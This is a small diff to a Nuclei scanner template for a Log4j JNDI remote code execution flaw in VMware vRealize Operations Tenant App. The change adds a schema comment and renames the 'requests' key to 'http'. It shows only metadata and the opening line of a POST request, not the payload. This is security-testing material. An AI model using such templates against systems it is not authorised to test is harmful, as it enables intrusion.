@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: vrealize-operations-log4j-rce
 info:
   name: VMware vRealize Operations Tenant App Log4j JNDI RCE
@@ -14,7 +15,7 @@ info:
   tags: rce,log4j,vmware,vrealize
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-requests:
+http:
   - raw:
       - |
         POST /suite-api/api/auth/token/acquire HTTP/1.1
